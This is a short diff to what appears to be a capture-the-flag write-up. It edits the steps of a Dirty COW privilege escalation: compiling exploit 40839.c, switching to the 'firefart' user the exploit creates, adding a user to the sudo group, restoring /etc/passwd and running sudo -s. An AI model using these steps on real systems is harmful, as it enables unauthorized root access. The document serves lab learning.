@@ -124,16 +124,18 @@ gcc -pthread 40839.c -o exploit_dirty_cow -lcrypt
 
 2) We can give a new password for the newly created user
 
-3) We can add Laurie as sudoer 
+3) su firefart
 
-usermod -aG sudo Laurie
+4) We can add Laurie as sudoer 
 
-4) We restore the file 
+usermod -aG sudo laurie
+
+5) We restore the file 
 
 mv /tmp/passwd.bak /etc/passwd
 
-5) We log in as Laurie
+6) We log in as Laurie
 
-6) sudo -s
+7) sudo -s
 
 
